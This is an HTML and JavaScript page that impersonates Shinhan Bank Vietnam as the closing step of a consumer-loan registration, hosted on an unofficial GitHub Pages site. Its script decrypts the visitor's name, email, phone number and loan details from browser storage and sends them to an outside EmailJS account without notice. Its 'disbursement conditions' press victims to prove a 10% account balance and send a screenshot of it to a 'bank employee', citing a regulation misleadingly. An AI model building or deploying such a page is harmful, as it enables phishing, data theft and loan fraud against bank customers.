<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Shinhan Bank - Hoàn Tất Đăng Ký</title>
    <!-- Bootstrap CSS để định kiểu cơ bản -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome cho các icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts cho font chữ Be Vietnam Pro -->
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Favicon của Shinhan Bank -->
    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
    <!-- CryptoJS để giải mã dữ liệu người dùng từ localStorage -->
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <!-- Thư viện QRious để tạo mã QR -->
    <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
    
    <!-- Thư viện EmailJS để gửi email trực tiếp từ client-side -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script type="text/javascript">
        (function() {
            // EmailJS Public Key đã được EmailJS tự động inject vào môi trường Canvas,
            // bạn không cần phải khai báo thủ công ở đây nếu đang chạy trên Canvas.
            // Nếu bạn đang phát triển cục bộ và gặp lỗi, hãy đặt Public Key của bạn vào đây:
            // emailjs.init('OrBsI926QI2_xBh1f'); 
        })();
    </script>
    
    <style>
        /* Định nghĩa các biến CSS để dễ dàng quản lý màu sắc, kích thước và hiệu ứng */
        :root {
            --primary-color: #0072CE;
            --secondary-color: #F5F7FA;
            --accent-color: #00A859;
            --text-color: #333;
            --text-light: #555;
            --border-color: #DEE2E6;
            --border-radius: 12px;
            --shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --error-color: #E63946; /* Đảm bảo màu lỗi được định nghĩa */
        }

        body {
            font-family: 'Be Vietnam Pro', sans-serif;
            background-color: var(--secondary-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            position: relative; /* Cần thiết để canvas pháo hoa bao phủ toàn bộ */
            min-height: 100vh; /* Đảm bảo body chiếm toàn bộ chiều cao viewport */
            display: flex;
            flex-direction: column;
        }
        
        /* Canvas cho hiệu ứng pháo hoa */
        #fireworksCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1; /* Đảm bảo pháo hoa nằm dưới nội dung chính */
            pointer-events: none; /* Cho phép tương tác với các phần tử HTML bên dưới */
        }

        .hidden { display: none !important; }

        /* Header */
        .app-header {
            background: #fff;
            padding: 15px 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 1010;
            flex-shrink: 0; /* Ngăn header bị co lại */
        }

        .app-header .logo {
            height: 30px;
        }

        /* Main Content */
        .main-container {
            flex-grow: 1; /* Cho phép main-container chiếm hết không gian còn lại */
            padding: 20px 10px;
            display: flex; /* Dùng flexbox để căn giữa nội dung theo chiều dọc */
            align-items: center;
            justify-content: center;
        }

        .completion-card {
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            overflow: hidden;
            text-align: center;
        }

        .completion-header {
            padding: 40px 30px;
            background: linear-gradient(135deg, var(--accent-color), #00c96d);
            color: white;
        }
        .completion-header .icon {
            font-size: 4rem;
            margin-bottom: 15px;
            animation: popIn 0.5s 0.2s ease-out backwards;
        }
        .completion-header h3 {
            font-weight: 700;
            margin: 0;
            font-size: 2rem;
             animation: fadeIn 0.5s 0.4s ease-out backwards;
        }
        .completion-header p {
            opacity: 0.9;
            margin-top: 10px;
            font-size: 1.1rem;
        }
        
        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .completion-body {
            padding: 30px;
        }

        .section-title {
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 20px;
            font-size: 1.3rem;
            text-align: left;
        }
        
        .next-steps-list {
            list-style: none;
            padding: 0;
            text-align: left;
        }
        .next-steps-list li {
            display: flex;
            align-items: flex-start;
            margin-bottom: 15px;
        }
        .next-steps-list .step-icon {
            color: var(--primary-color);
            font-size: 1.2rem;
            margin-right: 15px;
            margin-top: 5px;
            width: 20px;
            text-align: center;
        }

        .info-block {
            background-color: var(--secondary-color);
            padding: 20px;
            border-radius: var(--border-radius);
            margin-top: 30px;
            border: 1px solid var(--border-color);
            text-align: left;
        }
        
        .info-block p {
            margin: 0;
            color: var(--text-light);
        }

        .actions {
            padding: 30px;
            border-top: 1px solid var(--border-color);
        }

        .btn-action {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            color: white;
            font-weight: 600;
            padding: 12px 30px;
            font-size: 1.1rem;
            border-radius: 50px;
            transition: var(--transition);
            text-decoration: none;
            display: inline-flex; /* Để icon và text trên cùng một hàng */
            align-items: center;
            justify-content: center;
            margin: 5px; /* Khoảng cách giữa các nút */
        }
        .btn-action i {
            margin-right: 8px;
        }
        .btn-action:hover {
            background-color: #005a9e;
            border-color: #005a9e;
            color: white;
            transform: translateY(-2px);
        }

        .btn-secondary-action {
            background-color: transparent;
            border: 1px solid var(--primary-color);
            color: var(--primary-color);
        }
        .btn-secondary-action:hover {
            background-color: var(--primary-color);
            color: white;
        }
        
        /* Loading overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
        }
        .spinner-border-lg {
            width: 4rem;
            height: 4rem;
            color: var(--primary-color);
        }

        /* Registration ID and QR Code sections */
        .registration-id-section {
            background-color: var(--secondary-color);
            padding: 20px;
            border-radius: var(--border-radius);
            margin-bottom: 30px;
            border: 1px solid var(--border-color);
        }
        .registration-id-section .label {
            font-size: 0.9rem;
            color: var(--text-light);
            margin-bottom: 5px;
        }
        .registration-id-section .value-group {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .registration-id-section .value {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--primary-color);
            word-break: break-all; /* Ngắt từ dài để tránh tràn */
        }
        .copy-button {
            background: none;
            border: none;
            color: var(--primary-color);
            font-size: 1rem;
            cursor: pointer;
            transition: color 0.2s ease;
            white-space: nowrap; /* Ngăn nút xuống dòng */
        }
        .copy-button:hover {
            color: #005a9e;
        }
        .copy-button .fas {
            margin-right: 5px;
        }

        .qr-code-section {
            margin-bottom: 30px;
        }
        .qr-code-section canvas {
            width: 180px; /* Đặt kích thước cố định cho QR code */
            height: 180px;
            margin: 0 auto;
            display: block; /* Đảm bảo canvas là block để căn giữa */
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }

        /* Message box for copy confirmation */
        .message-box {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            z-index: 2000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
            font-size: 0.9rem;
        }
        .message-box.show {
            opacity: 1;
            visibility: visible;
        }

    </style>
</head>
<body>
    <canvas id="fireworksCanvas"></canvas>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner-border spinner-border-lg" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>
    
    <header class="app-header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo" class="logo">
    </header>

    <main class="main-container">
        <div id="completionCard" class="completion-card hidden">
            <div class="completion-header">
                <div class="icon"><i class="fas fa-check-circle"></i></div>
                <h3>ĐĂNG KÝ HOÀN TẤT</h3>
                <p>Mã đăng ký của bạn đã được tạo thành công!</p>
            </div>

            <div class="completion-body">
                <!-- Phần hiển thị mã đăng ký và nút sao chép -->
                <div class="registration-id-section">
                    <div class="label">Mã đăng ký của bạn:</div>
                    <div class="value-group">
                        <span id="registrationIdValue" class="value"></span>
                        <button id="copyIdButton" class="copy-button" aria-label="Sao chép mã đăng ký">
                            <i class="fas fa-copy"></i> Sao chép
                        </button>
                    </div>
                </div>

                <!-- Phần hiển thị mã QR -->
                <div class="qr-code-section">
                    <p class="label">Quét mã QR để truy cập nhanh:</p>
                    <canvas id="qrCodeCanvas"></canvas>
                </div>

                <h4 class="section-title">Điều kiện Giải ngân Bắt buộc</h4>
                <ul class="next-steps-list">
                    <li>
                        <i class="fas fa-balance-scale-right step-icon"></i>
                        <div>
                            <strong>Điều 1: Duy trì số dư tối thiểu</strong>
                            <p class="text-muted">Quý khách phải duy trì số dư tối thiểu <strong>10%</strong> giá trị khoản vay trong tài khoản (ví dụ: vay 30 triệu đồng, số dư tối thiểu 3 triệu đồng) nhằm chứng minh năng lực tài chính và khả năng trả nợ, theo quy định tại Thông tư 39/2016/TT-NHNN. Số dư này chỉ cần giữ trong tài khoản, không yêu cầu nạp thêm, đóng phí hoặc chuyển khoản.</p>
                        </div>
                    </li>
                     <li>
                        <i class="fas fa-camera-retro step-icon"></i>
                        <div>
                            <strong>Điều 2: Xác nhận đủ điều kiện số dư</strong>
                            <p class="text-muted">Quý khách chỉ cần cung cấp hình ảnh số dư trong tài khoản/thẻ thể hiện số dư tối thiểu 10% tính theo số tiền vay, gửi ảnh cho nhân viên ngân hàng để thẩm định và hoàn tất thủ tục. <strong>Lưu ý:</strong> Không cần đóng, nộp, hay chuyển tiền qua bất cứ cá nhân hay nhân viên nào để được giải ngân.</p>
                        </div>
                    </li>
                    <li>
                        <i class="fas fa-shield-alt step-icon"></i>
                        <div>
                            <strong>Điều 3: Vay tín chấp</strong>
                            <p class="text-muted">Khoản vay không yêu cầu thế chấp tài sản hoặc thẩm định bất động sản, phù hợp quy định vay tín chấp của Shinhan Bank. Sau khi đáp ứng các điều kiện, khoản vay sẽ được giải ngân vào tài khoản ngân hàng của Quý khách theo Hợp đồng Tín dụng.</p>
                        </div>
                    </li>
                </ul>

                <div class="info-block">
                    <p>Vui lòng kiểm tra Hợp đồng Vay Tiêu dùng và Bảng Điều Kiện Giải Ngân. Các điều khoản này đã được nêu rõ trong Hợp Đồng với Ngân hàng Shinhan Việt Nam.</p>
                </div>
            </div>

            <div class="actions">
                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html" class="btn-action">
                    <i class="fas fa-home"></i> Về trang chủ
                </a>
                <button id="downloadTicketButton" class="btn-action btn-secondary-action">
                    <i class="fas fa-download"></i> Tải thông tin
                </button>
            </div>
        </div>
    </main>

    <!-- Message box for copy confirmation -->
    <div id="messageBox" class="message-box hidden" role="alert" aria-live="polite"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
"use strict";

// --- Triển khai Hiệu ứng Pháo hoa ---
const Fireworks = {
    canvas: null,
    ctx: null,
    particles: [],
    fireworks: [],
    minParticles: 50,
    maxParticles: 150,
    hue: 0,

    init(canvasId) {
        this.canvas = document.getElementById(canvasId);
        this.ctx = this.canvas.getContext('2d');
        this.resizeCanvas();
        window.addEventListener('resize', this.resizeCanvas.bind(this));
        this.loop();
    },

    resizeCanvas() {
        this.canvas.width = window.innerWidth;
        this.canvas.height = window.innerHeight;
    },

    randomRange(min, max) {
        return Math.random() * (max - min) + min;
    },

    createFirework() {
        const x = this.randomRange(this.canvas.width * 0.1, this.canvas.width * 0.9);
        const y = this.randomRange(this.canvas.height * 0.1, this.canvas.height * 0.4); 
        const startY = this.canvas.height; 
        const color = `hsl(${this.hue}, 100%, 50%)`;
        this.fireworks.push(new FireworkParticle(x, startY, color, x, y, this.ctx));
        this.hue = (this.hue + this.randomRange(10, 50)) % 360; 
    },

    explode(x, y, color) {
        const count = this.randomRange(this.minParticles, this.maxParticles);
        for (let i = 0; i < count; i++) {
            this.particles.push(new FireworkParticle(x, y, color, null, null, this.ctx, true));
        }
    },

    update() {
        this.fireworks = this.fireworks.filter(firework => {
            firework.update();
            if (firework.targetReached()) {
                this.explode(firework.x, firework.y, firework.color);
                return false; 
            }
            return true;
        });

        this.particles = this.particles.filter(particle => {
            particle.update();
            return particle.alpha > 0; 
        });

        if (Math.random() < 0.015) { 
            this.createFirework();
        }
    },

    draw() {
        this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
        this.ctx.globalCompositeOperation = 'lighter';
        this.fireworks.forEach(firework => firework.draw());
        this.particles.forEach(particle => particle.draw());
        this.ctx.globalCompositeOperation = 'source-over';
    },

    loop() {
        this.update();
        this.draw();
        requestAnimationFrame(this.loop.bind(this));
    }
};

class FireworkParticle {
    constructor(x, y, color, targetX, targetY, ctx, isExploded = false) {
        this.x = x;
        this.y = y;
        this.color = color;
        this.ctx = ctx;
        this.isExploded = isExploded;

        if (this.isExploded) {
            this.speed = Fireworks.randomRange(1, 5); 
            this.angle = Math.random() * Math.PI * 2; 
            this.vx = Math.cos(this.angle) * this.speed;
            this.vy = Math.sin(this.angle) * this.speed;
            this.friction = 0.95; 
            this.gravity = 0.5; 
            this.alpha = 1; 
            this.decay = Fireworks.randomRange(0.01, 0.03); 
            this.size = Fireworks.randomRange(1, 3);
        } else {
            this.targetX = targetX;
            this.targetY = targetY;
            this.speed = Fireworks.randomRange(5, 10);
            this.angle = Math.atan2(targetY - y, targetX - x);
            this.vx = Math.cos(this.angle) * this.speed;
            this.vy = Math.sin(this.angle) * this.speed;
            this.distance = Math.sqrt(Math.pow(targetX - x, 2) + Math.pow(targetY - y, 2));
            this.traveled = 0;
            this.size = 2;
        }
    }

    update() {
        if (this.isExploded) {
            this.vx *= this.friction;
            this.vy *= this.friction;
            this.vy += this.gravity;
            this.alpha -= this.decay;
        } else {
            const dx = this.targetX - this.x;
            const dy = this.targetY - this.y;
            this.traveled = Math.sqrt(Math.pow(dx, 2) + Math.pow(dy, 2));
            
            if (this.traveled > this.speed) {
                this.x += this.vx;
                this.y += this.vy;
            } else {
                this.x = this.targetX;
                this.y = this.targetY;
            }
        }
    }

    targetReached() {
        return this.traveled <= this.speed && !this.isExploded; 
    }

    draw() {
        this.ctx.beginPath();
        if (this.isExploded) {
            this.ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            this.ctx.fillStyle = `hsla(${parseInt(this.color.substring(4, this.color.indexOf(',')))}, 100%, 50%, ${this.alpha})`;
        } else {
            this.ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            this.ctx.fillStyle = this.color;
        }
        this.ctx.fill();
    }
}
// --- Kết thúc Triển khai Hiệu ứng Pháo hoa ---


const CompletionApp = {
    state: {
        userData: null,
    },
    
    elements: {},

    config: {
        SECRET_KEY: 'shinhan-secret-key',
        EMAILJS_SERVICE_ID: 'service_60tgxof',
        EMAILJS_TEMPLATE_ID: 'template_e8o1t4w',
        FINAL_REDIRECT_URL: 'https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html', // Chuyển hướng về trang chủ sau khi hoàn tất
        // currentStep_MIN_REQUIRED là bước tối thiểu người dùng phải hoàn thành trước khi truy cập trang này
        // Giả định step 7 là bước trước đó nếu đây là step8 cuối cùng
        currentStep_MIN_REQUIRED: 7, 
        DEFAULT_REGISTRATION_ID: 'SHB-XYZ-12345', // ID mặc định nếu không có dữ liệu
        DOWNLOAD_FILE_URL: 'https://vaytieudung.github.io/shinhanbank/files/sample-ticket.pdf', // URL file PDF mẫu để tải xuống
    },

    init() {
        this.cacheDOMElements();
        // Bắt đầu hiệu ứng pháo hoa ngay lập tức khi trang được tải
        Fireworks.init('fireworksCanvas');

        if (!this.loadAndValidateData()) {
            // Nếu dữ liệu không hợp lệ, chuyển hướng người dùng về trang bắt đầu
            console.error('Dữ liệu người dùng không hợp lệ hoặc thiếu. Chuyển hướng về trang bắt đầu.');
            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
            return;
        }
        
        // Gửi email thông báo sau khi xác thực dữ liệu thành công
        this.sendNotificationEmail();

        // Ẩn overlay loading và hiển thị thẻ hoàn tất đăng ký
        this.elements.loadingOverlay.style.display = 'none';
        this.elements.completionCard.classList.remove('hidden');

        // Hiển thị chi tiết đăng ký và tạo mã QR
        this.renderRegistrationDetails();
        this.generateQRCode();

        // Thêm các sự kiện lắng nghe cho các nút
        this.addEventListeners();

        // Thêm một độ trễ trước khi xóa dữ liệu và chuyển hướng, để người dùng có thời gian đọc thông báo
        // Điều chỉnh thời gian này tùy theo lượng thông tin muốn người dùng đọc
        setTimeout(() => {
            this.cleanUpAndRedirect();
        }, 8000); // 8 giây để người dùng đọc thông tin quan trọng
    },

    cacheDOMElements() {
        const ids = ['loadingOverlay', 'completionCard', 'fireworksCanvas', 'registrationIdValue', 'qrCodeCanvas', 'copyIdButton', 'downloadTicketButton', 'messageBox'];
        ids.forEach(id => this.elements[id] = document.getElementById(id));
    },

    loadAndValidateData() {
        try {
            const storedData = localStorage.getItem('userData');
            if (!storedData) {
                console.warn('Không tìm thấy dữ liệu người dùng trong localStorage.');
                // Dành cho mục đích demo: Sử dụng dữ liệu mặc định nếu không có dữ liệu thật
                this.state.userData = { 
                    registrationId: this.config.DEFAULT_REGISTRATION_ID,
                    fullName: 'Khách Hàng Demo',
                    email: 'demo@example.com',
                    phone: '0901234567',
                    loanAmount: 50000000,
                    loanTerm: 36,
                    currentStep: this.config.currentStep_MIN_REQUIRED // Giả định là đã qua các bước
                };
                return true; // Cho phép hiển thị trang với dữ liệu mặc định
            }
            
            const decryptedBytes = CryptoJS.AES.decrypt(storedData, this.config.SECRET_KEY);
            const decryptedData = decryptedBytes.toString(CryptoJS.enc.Utf8);
            
            if (!decryptedData) {
                 console.error('Giải mã dữ liệu thất bại. Dữ liệu có thể bị hỏng hoặc sai khóa.');
                 localStorage.removeItem('userData'); // Xóa dữ liệu lỗi
                 return false;
            }

            this.state.userData = JSON.parse(decryptedData);
            
            // Kiểm tra bước hiện tại. Nếu đây là step8, người dùng phải hoàn thành tất cả các bước trước đó.
            if (!this.state.userData.currentStep || this.state.userData.currentStep < this.config.currentStep_MIN_REQUIRED) { 
                 console.error(`Người dùng không ở bước chính xác để xem trang này. Yêu cầu bước >= ${this.config.currentStep_MIN_REQUIRED}.`);
                 localStorage.removeItem('userData'); // Xóa dữ liệu không đúng bước
                 return false;
            }
            
            // Kiểm tra các trường dữ liệu cần thiết cho việc gửi email và hiển thị
            const requiredFields = ['fullName', 'email', 'phone', 'loanAmount', 'loanTerm', 'registrationId'];
            const missingFields = requiredFields.filter(field => {
                const value = this.state.userData[field];
                return value === undefined || value === null || value === '';
            });

            if (missingFields.length > 0) {
                console.warn('Thiếu hoặc dữ liệu không hợp lệ cho trang này:', missingFields);
                // Nếu thiếu registrationId, tạo một cái ngẫu nhiên
                if (!this.state.userData.registrationId) {
                    this.state.userData.registrationId = `SHB-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
                    console.warn('Đã tạo ID đăng ký ngẫu nhiên do thiếu.');
                }
            }

            return true;

        } catch (error) {
            console.error('Lỗi khi tải hoặc xác thực dữ liệu người dùng:', error);
            localStorage.removeItem('userData'); // Xóa dữ liệu lỗi để tránh lặp lại vấn đề
            return false;
        }
    },

    // Hiển thị chi tiết đăng ký trên giao diện
    renderRegistrationDetails() {
        this.elements.registrationIdValue.textContent = this.state.userData.registrationId || this.config.DEFAULT_REGISTRATION_ID;
    },

    // Tạo và hiển thị mã QR
    generateQRCode() {
        const qrContent = JSON.stringify({
            id: this.state.userData.registrationId || 'N/A',
            name: this.state.userData.fullName || 'Anonymous',
            // Thêm các dữ liệu khác mà bạn muốn mã QR chứa
            loanAmount: this.state.userData.loanAmount || 'N/A'
        });

        // Lấy màu primary từ CSS để sử dụng cho QR code
        const primaryColor = getComputedStyle(document.documentElement).getPropertyValue('--primary-color').trim();

        // Kiểm tra xem thư viện QRious đã tải chưa
        if (typeof QRious === 'undefined') {
            console.error('Lỗi: Thư viện QRious chưa được tải.');
            // Hiển thị thông báo lỗi thân thiện nếu không thể tạo mã QR
            const ctx = this.elements.qrCodeCanvas.getContext('2d');
            ctx.clearRect(0, 0, this.elements.qrCodeCanvas.width, this.elements.qrCodeCanvas.height);
            ctx.font = '12px "Be Vietnam Pro"';
            ctx.fillStyle = 'red';
            ctx.fillText('Không thể tạo mã QR', 10, 50);
            return;
        }

        new QRious({
            element: this.elements.qrCodeCanvas,
            value: qrContent,
            size: 180, // Kích thước của mã QR
            foreground: primaryColor, // Sử dụng màu chính của Shinhan
            background: 'white',
        });
    },

    // Thêm các sự kiện lắng nghe cho nút sao chép và tải xuống
    addEventListeners() {
        this.elements.copyIdButton.addEventListener('click', () => this.copyToClipboard(this.elements.registrationIdValue.textContent));
        this.elements.downloadTicketButton.addEventListener('click', () => this.downloadTicket());
    },

    // Sao chép mã đăng ký vào clipboard
    copyToClipboard(text) {
        if (!text) return;
        try {
            // Sử dụng API navigator.clipboard nếu có, fallback về execCommand
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text)
                    .then(() => this.showMessage('Đã sao chép!', 1500))
                    .catch(err => {
                        console.error('Không thể sao chép API clipboard:', err);
                        this._fallbackCopyToClipboard(text);
                    });
            } else {
                this._fallbackCopyToClipboard(text);
            }
        } catch (err) {
            console.error('Lỗi khi sao chép:', err);
            this.showMessage('Sao chép thất bại!', 1500);
        }
    },

    _fallbackCopyToClipboard(text) {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = 'fixed'; // Tránh cuộn trang
        textArea.style.top = '0';
        textArea.style.left = '0';
        textArea.style.opacity = '0'; // Ẩn hoàn toàn
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
            document.execCommand('copy');
            this.showMessage('Đã sao chép!', 1500);
            console.log('Copied to clipboard (fallback):', text);
        } catch (err) {
            console.error('Không thể sao chép vào clipboard (fallback):', err);
            this.showMessage('Sao chép thất bại!', 1500);
        } finally {
            document.body.removeChild(textArea);
        }
    },

    // Tải xuống file "vé" hoặc thông tin PDF
    downloadTicket() {
        // Trong môi trường production, tệp PDF này nên được tạo động trên server
        // với thông tin chi tiết của người dùng.
        const link = document.createElement('a');
        link.href = this.config.DOWNLOAD_FILE_URL;
        link.download = `Shinhan_ThongTinDangKy_${this.state.userData.registrationId || 'Unknown'}.pdf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        this.showMessage('Đang tải xuống...', 1500);
        console.log('Đã yêu cầu tải xuống tệp PDF.');
    },

    sendNotificationEmail() {
        console.log('Đang chuẩn bị gửi email thông báo...');

        const templateParams = {
            fullName: this.state.userData.fullName || 'Khách hàng không tên',
            email: this.state.userData.email || 'email@khongco.com',
            phone: this.state.userData.phone || 'Không có số điện thoại',
            loanAmount: this.state.userData.loanAmount ? `${this.state.userData.loanAmount.toLocaleString('vi-VN')} VNĐ` : 'Chưa xác định',
            loanTerm: this.state.userData.loanTerm ? `${this.state.userData.loanTerm} tháng` : 'Chưa xác định',
            registrationId: this.state.userData.registrationId || 'N/A' 
        };
        
        emailjs.send(this.config.EMAILJS_SERVICE_ID, this.config.EMAILJS_TEMPLATE_ID, templateParams)
            .then((response) => {
               console.log('GỬI EMAIL THÀNH CÔNG!', response.status, response.text);
            }, (error) => {
               console.error('GỬI EMAIL THẤT BẠI. Lỗi:', error);
            });
    },

    // Hiển thị một hộp thông báo tùy chỉnh
    showMessage(message, duration, callback = null) {
        const messageBox = this.elements.messageBox;
        messageBox.textContent = message;
        messageBox.classList.remove('hidden');
        messageBox.classList.add('show');

        setTimeout(() => {
            messageBox.classList.remove('show');
            setTimeout(() => {
                messageBox.classList.add('hidden');
                if (callback) {
                    callback();
                }
            }, 300); // Thời gian của transition opacity
        }, duration);
    },

    cleanUpAndRedirect() {
        // Xóa dữ liệu người dùng khỏi localStorage để đảm bảo bảo mật sau khi hoàn tất quy trình
        localStorage.removeItem('userData'); 
        console.log('Dữ liệu người dùng đã được xóa khỏi localStorage. Đang chuyển hướng...');
        // Chuyển hướng người dùng về trang đích cuối cùng
        window.location.href = this.config.FINAL_REDIRECT_URL;
    }
};

document.addEventListener('DOMContentLoaded', () => {
    // Để lấy màu từ CSS cho QRious, chúng ta cần một hàm hỗ trợ
    // getComputedStyle là cách tốt nhất để lấy giá trị biến CSS trong JS
    // Không cần định nghĩa lại window.var_primary_color nữa
    CompletionApp.init();
});
</script>
</body>
</html>
